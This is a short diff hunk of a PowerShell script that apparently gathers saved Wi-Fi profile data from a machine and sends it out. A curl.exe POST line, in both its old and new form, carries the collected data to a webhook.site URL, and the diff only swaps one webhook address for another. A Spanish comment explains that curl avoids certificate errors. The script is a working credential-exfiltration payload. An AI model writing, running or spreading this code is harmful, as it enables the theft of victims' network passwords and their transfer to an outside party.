@@ -17,5 +17,5 @@ $wifiData = foreach ($n in $profiles) {
 if ($wifiData) {
     $payload = $wifiData -join "`n"
     # El uso de curl evita errores de certificados y sesiones de PowerShell
-    curl.exe -X POST -d "$payload" "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c"
+    curl.exe -X POST -d "$payload" "https://webhook.site/3d5fbea1-26d8-419e-b33a-89f160d28fe1"
 }
